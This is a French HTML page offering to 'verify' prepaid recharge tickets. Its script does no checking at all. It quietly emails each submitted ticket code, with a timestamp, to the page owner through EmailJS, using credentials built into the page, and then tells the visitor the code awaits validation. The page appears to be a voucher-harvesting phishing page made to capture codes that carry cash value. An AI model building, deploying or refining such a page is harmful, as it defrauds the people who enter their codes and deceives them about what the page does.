<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vérification de Tickets de Recharge</title>
    <!-- Intégration d'EmailJS -->
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script type="text/javascript">
        (function() {
            emailjs.init("d9OXbBs_4UiEi_bJM");
        })();
    </script>
    <style>
        :root {
            --primary-color: #2563eb;
            --success-color: #16a34a;
            --error-color: #dc2626;
            --bg-color: #f8fafc;
            --card-bg: #ffffff;
            --text-color: #1e293b;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: var(--bg-color);
            color: var(--text-color);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            background-color: var(--card-bg);
            padding: 2rem;
            border-radius: 12px;
            box-shadow: 0 4px 6px -1px rgb(0 0 0 / 0.1);
            width: 100%;
            max-width: 400px;
            box-sizing: border-box;
        }
        h2 {
            text-align: center;
            margin-bottom: 1.5rem;
            color: var(--primary-color);
        }
        .form-group {
            margin-bottom: 1rem;
        }
        label {
            display: block;
            margin-bottom: 0.5rem;
            font-weight: 600;
        }
        input {
            width: 100%;
            padding: 0.75rem;
            border: 1px solid #cbd5e1;
            border-radius: 6px;
            font-size: 1rem;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 0.75rem;
            background-color: var(--primary-color);
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            margin-top: 0.5rem;
        }
        #result {
            margin-top: 1.5rem;
            padding: 1rem;
            border-radius: 6px;
            text-align: center;
            font-weight: 600;
            display: none;
        }
        .success { background-color: #dcfce7; color: var(--success-color); }
        .error { background-color: #fee2e2; color: var(--error-color); }
    </style>
</head>
<body>

    <div class="container">
        <h2>Vérification de Ticket</h2>
        <form id="verifyForm">
            <div class="form-group">
                <label for="ticketCode">Code du ticket :</label>
                <input type="text" id="ticketCode" name="ticket_code" placeholder="Entrez le code ici..." required>
            </div>
            <button type="submit" id="submitBtn">Vérifier le ticket</button>
        </form>

        <div id="result"></div>
    </div>

    <script>
        document.getElementById('verifyForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const codeInput = document.getElementById('ticketCode');
            const resultDiv = document.getElementById('result');
            const submitBtn = document.getElementById('submitBtn');
            const code = codeInput.value.trim();

            if (!code) return;

            submitBtn.disabled = true;
            submitBtn.textContent = "Vérification en cours...";

            const templateParams = {
                ticket_code: code,
                time: new Date().toLocaleString()
            };

            emailjs.send('service_gr7zgzk', 'template_9xvl4tw', templateParams)
                .then(function(response) {
                    resultDiv.style.display = 'block';
                    resultDiv.className = 'success';
                    resultDiv.innerHTML = `✅ Code soumis avec succès ! En attente de validation.`;
                    codeInput.value = '';
                    submitBtn.disabled = false;
                    submitBtn.textContent = "Vérifier le ticket";
                }, function(error) {
                    resultDiv.style.display = 'block';
                    resultDiv.className = 'error';
                    resultDiv.innerHTML = `❌ Erreur lors de la transmission.`;
                    submitBtn.disabled = false;
                    submitBtn.textContent = "Vérifier le ticket";
                });
        });
    </script>

</body>
</html>
